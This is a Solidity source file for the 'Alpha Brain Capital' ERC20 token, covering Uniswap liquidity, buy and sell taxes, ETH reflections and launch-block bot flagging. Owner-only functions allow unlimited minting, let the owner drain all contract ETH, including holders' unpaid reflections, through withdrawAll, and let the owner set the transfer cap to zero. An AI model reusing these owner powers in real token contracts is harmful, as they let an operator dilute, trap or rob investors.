// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./console.sol";
import "./ERC20.sol";
import "./Ownable.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Router02.sol";

contract ABC is ERC20, Ownable {
    modifier lockSwap {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    modifier liquidityAdd {
        _inLiquidityAdd = true;
        _;
        _inLiquidityAdd = false;
    }

    uint256 internal _maxTransfer = 5;
    uint256 internal _marketingRate1 = 14;
    uint256 internal _marketingRate2 = 10;
    uint256 internal _reflectRate = 10;
    uint256 internal _cooldown = 60 seconds;
    uint256 internal _swapFeesAt = 1000 ether;
    bool internal _useSecondFees = false;
    bool internal _swapFees = true;

    // total wei reflected ever
    uint256 internal _ethReflectionBasis;
    uint256 internal _totalReflected;
    uint256 internal _totalMarketing;

    address payable internal _marketingWallet;
    address payable internal _treasuryWallet;

    uint256 internal _totalSupply = 0;
    IUniswapV2Router02 internal _router = IUniswapV2Router02(address(0));
    address internal _pair;
    bool internal _inSwap = false;
    bool internal _inLiquidityAdd = false;
    bool internal _tradingActive = false;
    uint256 internal _tradingStartBlock = 0;

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _reflectionExcluded;
    mapping(address => bool) private _taxExcluded;
    mapping(address => bool) private _bot;
    mapping(address => uint256) private _lastBuy;
    mapping(address => uint256) private _lastReflectionBasis;
    address[] internal _reflectionExcludedList;

    constructor(
        address uniswapFactory,
        address uniswapRouter,
        address payable treasuryWallet
    ) ERC20("Alpha Brain Capital", "ABC") Ownable() {
        addTaxExcluded(owner());
        addTaxExcluded(treasuryWallet);
        addTaxExcluded(address(this));

        _marketingWallet = payable(owner());
        _treasuryWallet = treasuryWallet;

        _router = IUniswapV2Router02(uniswapRouter);
        IUniswapV2Factory uniswapContract = IUniswapV2Factory(uniswapFactory);
        _pair = uniswapContract.createPair(address(this), _router.WETH());
    }

    function addLiquidity(uint256 tokens) public payable onlyOwner() liquidityAdd {
        _mint(address(this), tokens);
        _approve(address(this), address(_router), tokens);

        _router.addLiquidityETH{value: msg.value}(
            address(this),
            tokens,
            0,
            0,
            _marketingWallet,
            // solhint-disable-next-line not-rely-on-time
            block.timestamp
        );

        if (!_tradingActive) {
            _tradingActive = true;
            _tradingStartBlock = block.number;
        }
    }

    function addReflection() public payable {
        _ethReflectionBasis += msg.value;
    }

    function isReflectionExcluded(address account) public view returns (bool) {
        return _reflectionExcluded[account];
    }

    function removeReflectionExcluded(address account) public onlyOwner() {
        require(isReflectionExcluded(account), "Account must be excluded");

        _reflectionExcluded[account] = false;
    }

    function addReflectionExcluded(address account) public onlyOwner() {
        _addReflectionExcluded(account);
    }

    function _addReflectionExcluded(address account) internal {
        require(!isReflectionExcluded(account), "Account must not be excluded");
        _reflectionExcluded[account] = true;
    }

    function isTaxExcluded(address account) public view returns (bool) {
        return _taxExcluded[account];
    }

    function addTaxExcluded(address account) public onlyOwner() {
        require(!isTaxExcluded(account), "Account must not be excluded");

        _taxExcluded[account] = true;
    }

    function removeTaxExcluded(address account) public onlyOwner() {
        require(isTaxExcluded(account), "Account must not be excluded");

        _taxExcluded[account] = false;
    }

    function isBot(address account) public view returns (bool) {
        return _bot[account];
    }

    function addBot(address account) internal {
        _addBot(account);
    }

    function _addBot(address account) internal {
        require(!isBot(account), "Account must not be flagged");
        require(account != address(_router), "Account must not be uniswap router");
        require(account != _pair, "Account must not be uniswap pair");

        _bot[account] = true;
        _addReflectionExcluded(account);
    }

    function removeBot(address account) public onlyOwner() {
        require(isBot(account), "Account must be flagged");

        _bot[account] = false;
        removeReflectionExcluded(account);
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function _addBalance(address account, uint256 amount) internal {
        _balances[account] = _balances[account] + amount;
    }

    function _subtractBalance(address account, uint256 amount) internal {
        _balances[account] = _balances[account] - amount;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        if (isTaxExcluded(sender) || isTaxExcluded(recipient)) {
            _rawTransfer(sender, recipient, amount);
            return;
        }

        require(!isBot(sender), "Sender locked as bot");
        require(!isBot(recipient), "Recipient locked as bot");
        uint256 maxTxAmount = totalSupply() * _maxTransfer / 1000;
        require(amount <= maxTxAmount || _inLiquidityAdd || _inSwap || recipient == address(_router), "Exceeds max transaction amount");

        uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinTokenBalance = contractTokenBalance >= _swapFeesAt;

        if(contractTokenBalance >= maxTxAmount) {
            contractTokenBalance = maxTxAmount;
        }

        if (
            overMinTokenBalance &&
            !_inSwap &&
            sender != _pair &&
            _swapFees
        ) {
            _swap(contractTokenBalance);
        }

        _claimReflection(payable(sender));
        _claimReflection(payable(recipient));

        uint256 send = amount;
        uint256 reflect;
        uint256 marketing;
        if (sender == _pair && _tradingActive) {
            // Buy, apply buy fee schedule
            (
                send,
                reflect,
                marketing
            ) = _getBuyTaxAmounts(amount);
            require(block.timestamp - _lastBuy[tx.origin] > _cooldown || _inSwap, "hit cooldown, try again later");
            _lastBuy[tx.origin] = block.timestamp;
        } else if (recipient == _pair && _tradingActive) {
            // Sell, apply sell fee schedule
            (
                send,
                reflect,
                marketing
            ) = _getSellTaxAmounts(amount);
        }

        _rawTransfer(sender, recipient, send);
        _takeMarketing(sender, marketing);
        _reflect(sender, reflect);

        if (_tradingActive && block.number == _tradingStartBlock && !isTaxExcluded(tx.origin)) {
            if (tx.origin == address(_pair)) {
                if (sender == address(_pair)) {
                    _addBot(recipient);
                } else {
                    _addBot(sender);
                }
            } else {
                _addBot(tx.origin);
            }
        }
    }

    function _claimReflection(address payable addr) internal {
        if (addr == _pair || addr == address(_router)) return;

        uint256 basisDifference = _ethReflectionBasis - _lastReflectionBasis[addr];
        uint256 owed = basisDifference * balanceOf(addr) / _totalSupply;

        _lastReflectionBasis[addr] = _ethReflectionBasis;
        if (owed == 0) {
                return;
        }
        addr.transfer(owed);
    }

    function claimReflection() public {
        _claimReflection(payable(msg.sender));
    }

    function _swap(uint256 amount) internal lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();

        _approve(address(this), address(_router), amount);

        uint256 contractEthBalance = address(this).balance;

        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 tradeValue = address(this).balance - contractEthBalance;

        uint256 marketingAmount = amount * _totalMarketing / (_totalMarketing + _totalReflected);
        uint256 reflectedAmount = amount - marketingAmount;

        uint256 marketingEth = tradeValue * _totalMarketing / (_totalMarketing + _totalReflected);
        uint256 reflectedEth = tradeValue - marketingEth;

        if (marketingEth > 0) {
            uint256 split = marketingEth / 2;
            _marketingWallet.transfer(split);
            _treasuryWallet.transfer(marketingEth - split);
        }
        _totalMarketing -= marketingAmount;
        _totalReflected -= reflectedAmount;
        _ethReflectionBasis += reflectedEth;
    }

    function swapAll() public {
        uint256 maxTxAmount = totalSupply() * _maxTransfer / 1000;
        uint256 contractTokenBalance = balanceOf(address(this));

        if(contractTokenBalance >= maxTxAmount)
        {
            contractTokenBalance = maxTxAmount;
        }

        if (
            !_inSwap
        ) {
            _swap(contractTokenBalance);
        }
    }

    function withdrawAll() public onlyOwner() {
        uint256 split = address(this).balance / 2;
        _marketingWallet.transfer(split);
        _treasuryWallet.transfer(address(this).balance - split);
    }

    function _reflect(address account, uint256 amount) internal {
        require(account != address(0), "reflect from the zero address");

        _rawTransfer(account, address(this), amount);
        _totalReflected += amount;
        emit Transfer(account, address(this), amount);
    }

    function _takeMarketing(address account, uint256 amount) internal {
        require(account != address(0), "take marketing from the zero address");

        _rawTransfer(account, address(this), amount);
        _totalMarketing += amount;
        emit Transfer(account, address(this), amount);
    }

    function _getBuyTaxAmounts(uint256 amount)
        internal
        view
        returns (
            uint256 send,
            uint256 reflect,
            uint256 marketing
        )
    {
        marketing = 0;
        reflect = 0;
        if (_useSecondFees) {
            uint256 sendRate = 100 - _reflectRate;
            assert(sendRate >= 0);

            send = (amount * sendRate) / 100;
            reflect = amount - send;
            assert(reflect >= 0);
            assert(send + reflect + marketing == amount);
        } else {
            uint256 sendRate = 100 - _marketingRate1;
            assert(sendRate >= 0);

            send = (amount * sendRate) / 100;
            marketing = amount - send;
            assert(reflect >= 0);
            assert(send + reflect + marketing == amount);
        }
    }

    function _getSellTaxAmounts(uint256 amount)
        internal
        view
        returns (
            uint256 send,
            uint256 reflect,
            uint256 marketing
        )
    {
        marketing = 0;
        reflect = 0;
        if (_useSecondFees) {
            uint256 sendRate = 100 - _marketingRate2;
            assert(sendRate >= 0);

            send = (amount * sendRate) / 100;
            marketing = amount - send;
            assert(reflect >= 0);
            assert(send + reflect + marketing == amount);
        } else {
            uint256 sendRate = 100 - _marketingRate1;
            assert(sendRate >= 0);

            send = (amount * sendRate) / 100;
            marketing = amount - send;
            assert(reflect >= 0);
            assert(send + reflect + marketing == amount);
        }
    }

    // modified from OpenZeppelin ERC20
    function _rawTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "transfer from the zero address");
        require(recipient != address(0), "transfer to the zero address");

        uint256 senderBalance = balanceOf(sender);
        require(senderBalance >= amount, "transfer amount exceeds balance");
        unchecked {
            _subtractBalance(sender, amount);
        }
        _addBalance(recipient, amount);

        emit Transfer(sender, recipient, amount);
    }

    function setMaxTransfer(uint256 maxTransfer) public onlyOwner() {
        _maxTransfer = maxTransfer;
    }

    function setSwapFees(bool swapFees) public onlyOwner() {
        _swapFees = swapFees;
    }

    function setUseSecondFees(bool useSecondFees) public onlyOwner() {
        _useSecondFees = useSecondFees;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function _mint(address account, uint256 amount) internal override {
        _totalSupply += amount;
        _addBalance(account, amount);
        emit Transfer(address(0), account, amount);
    }

    function mint(address account, uint256 amount) public onlyOwner() {
        _mint(account, amount);
    }

    function airdrop(address[] memory accounts, uint256[] memory amounts) public onlyOwner() {
        require(accounts.length == amounts.length, "array lengths must match");

        for (uint256 i = 0; i < accounts.length; i++) {
            _mint(accounts[i], amounts[i]);
        }
    }

    receive() external payable {}
}